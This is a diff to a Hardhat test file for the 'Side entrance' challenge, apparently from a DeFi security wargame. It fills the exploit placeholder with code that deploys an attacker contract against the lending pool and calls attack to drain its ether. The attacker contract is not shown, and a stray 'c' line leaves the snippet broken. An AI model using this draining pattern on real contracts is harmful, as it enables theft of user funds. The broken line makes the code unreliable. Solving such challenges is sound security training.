@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { SignerWithAddress } = require('@nomiclabs/hardhat-ethers/signers');
 
 describe('[Challenge] Side entrance', function () {
 
@@ -24,7 +25,10 @@ describe('[Challenge] Side entrance', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        const SideEntranceAttackerFactory = await ethers.getContractFactory('SideEntranceAttacker', deployer);
+        const sideEntraceAttacker = await SideEntranceAttackerFactory.deploy(this.pool.address, attacker.address);
+        c
+        await sideEntraceAttacker.attack(ETHER_IN_POOL);
     });
 
     after(async function () {
